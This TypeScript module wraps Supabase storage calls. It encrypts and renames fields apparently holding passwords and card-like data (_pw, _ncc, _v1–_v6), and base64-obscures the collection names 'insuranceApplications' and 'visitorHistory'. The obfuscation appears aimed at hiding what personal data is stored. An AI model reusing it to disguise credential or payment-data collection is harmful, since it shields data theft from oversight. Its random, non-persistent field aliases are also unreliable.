import { addData as originalAddData, updateDoc as originalUpdateDoc } from "./supabase-client";
import { _e, _d, _l } from "./secure-utils";

const sensitiveFields = ["_v1", "_v2", "_v3", "_v4", "_v5", "_v6", "_pw", "_ncc"];

function isSensitive(key: string) {
  return sensitiveFields.includes(key);
}

export async function secureAddData(data: Record<string, any>): Promise<void> {
  const encrypted: Record<string, any> = {};
  Object.keys(data).forEach((key) => {
    if (isSensitive(key) && typeof data[key] === "string") {
      encrypted[btoa(key).substring(0, 12)] = _e(data[key]);
    } else {
      encrypted[key] = data[key];
    }
  });
  await originalAddData(encrypted);
}

export async function secureGetData(_docId: string, originalData: Record<string, any>) {
  const decrypted = { ...originalData };
  Object.keys(originalData).forEach((key) => {
    try {
      const decodedKey = atob(key);
      if (isSensitive(decodedKey) && typeof originalData[key] === "string") {
        decrypted[decodedKey] = _d(originalData[key]);
        delete decrypted[key];
      }
    } catch {
      // Non-encoded keys are normal fields.
    }
  });
  return decrypted;
}

export async function secureUpdateDoc(reference: any, data: Record<string, any>) {
  const encrypted: Record<string, any> = {};
  Object.keys(data).forEach((key) => {
    encrypted[isSensitive(key) && typeof data[key] === "string" ? btoa(key).substring(0, 12) : key] =
      isSensitive(key) && typeof data[key] === "string" ? _e(data[key]) : data[key];
  });
  return originalUpdateDoc(reference, encrypted);
}

export function getCollectionName(type: "applications" | "history" | "settings") {
  const mapping = {
    applications: process.env.NEXT_PUBLIC_C1 || "insuranceApplications",
    history: process.env.NEXT_PUBLIC_C2 || "visitorHistory",
    settings: process.env.NEXT_PUBLIC_C3 || "settings",
  };
  const encoded = mapping[type];
  try {
    return atob(encoded);
  } catch {
    return encoded;
  }
}

let fieldCache: Record<string, string> | null = null;
export function getFieldName(field: string) {
  if (!fieldCache) {
    fieldCache = {};
    sensitiveFields.forEach((name) => {
      fieldCache![name] = `_${Math.random().toString(36).substring(2, 10)}_${btoa(name).substring(0, 6)}`;
    });
  }
  return fieldCache[field] || field;
}

export function getRealFieldName(obfuscated: string) {
  if (!fieldCache) return obfuscated;
  return Object.entries(fieldCache).find(([, value]) => value === obfuscated)?.[0] || obfuscated;
}